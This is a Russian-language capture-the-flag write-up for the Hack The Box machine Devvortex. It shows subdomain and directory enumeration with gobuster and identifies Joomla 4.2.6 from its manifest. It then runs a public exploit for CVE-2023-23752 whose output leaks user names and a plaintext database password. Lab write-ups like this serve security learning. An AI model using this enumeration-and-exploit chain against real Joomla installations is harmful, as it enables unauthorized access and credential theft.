## Devvortex HTB

Сначало сканируем nmap

Ничего необычного.

Далее смотрю директории, опять таки ничего.

поэтому смотрю сабдомены. и нахожу то, за что можно зацепится:

```bash
gobuster vhost -u http://devvortex.htb/ -w SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]
```
Теперь проверим этот субдомен на наличие директорий и тут уже есть за что схватится:

```bash
gobuster dir -u http://dev.devvortex.htb/ -w SecLists-master/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists-master/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git-rewrite         (Status: 403) [Size: 162]
/.forward             (Status: 403) [Size: 162]
/.cvs                 (Status: 403) [Size: 162]
/.git                 (Status: 403) [Size: 162]
/.cache               (Status: 403) [Size: 162]
/.git/HEAD            (Status: 403) [Size: 162]
/.bashrc              (Status: 403) [Size: 162]
/.config              (Status: 403) [Size: 162]
/.env                 (Status: 403) [Size: 162]
/.cvsignore           (Status: 403) [Size: 162]
/.bash_history        (Status: 403) [Size: 162]
/.git/index           (Status: 403) [Size: 162]
/.git/config          (Status: 403) [Size: 162]
/.gitattributes       (Status: 403) [Size: 162]
/.git/logs/           (Status: 403) [Size: 162]
/.git_release         (Status: 403) [Size: 162]
/.gitconfig           (Status: 403) [Size: 162]
/.gitkeep             (Status: 403) [Size: 162]
/.gitk                (Status: 403) [Size: 162]
/.gitmodules          (Status: 403) [Size: 162]
/.gitignore           (Status: 403) [Size: 162]
/.gitreview           (Status: 403) [Size: 162]
/.history             (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.listing             (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.mysql_history       (Status: 403) [Size: 162]
/.passwd              (Status: 403) [Size: 162]
/.listings            (Status: 403) [Size: 162]
/.perf                (Status: 403) [Size: 162]
/.profile             (Status: 403) [Size: 162]
/.rhosts              (Status: 403) [Size: 162]
/.ssh                 (Status: 403) [Size: 162]
/.subversion          (Status: 403) [Size: 162]
/.svn                 (Status: 403) [Size: 162]
/.sh_history          (Status: 403) [Size: 162]
/.svn/entries         (Status: 403) [Size: 162]
/.svnignore           (Status: 403) [Size: 162]
/.web                 (Status: 403) [Size: 162]
/.swf                 (Status: 403) [Size: 162]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/api/experiments/configurations (Status: 406) [Size: 29]
/api/experiments      (Status: 406) [Size: 29]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/node_modules/.package-lock.json (Status: 403) [Size: 162]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

Заходим на админку и видем CSM Joomla, проверям версию: http://dev.devvortex.htb/administrator/manifests/files/joomla.xml

```xml
<extension type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<version>4.2.6</version>
<creationDate>2022-12</creationDate>
<description>FILES_JOOMLA_XML_DESCRIPTION</description>
<scriptfile>administrator/components/com_admin/script.php</scriptfile>
<update>
<schemas>
<schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
<schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
</schemas>
</update>
<fileset>
<files>
<folder>administrator</folder>
<folder>api</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
</files>
</fileset>
<updateservers>
<server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
</updateservers>
</extension>
```

Проверяем на наличия эксплойтов: https://github.com/Acceis/exploit-CVE-2023-23752

Запускаем и получаем нашего юзера и пароль:

```bash
ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```





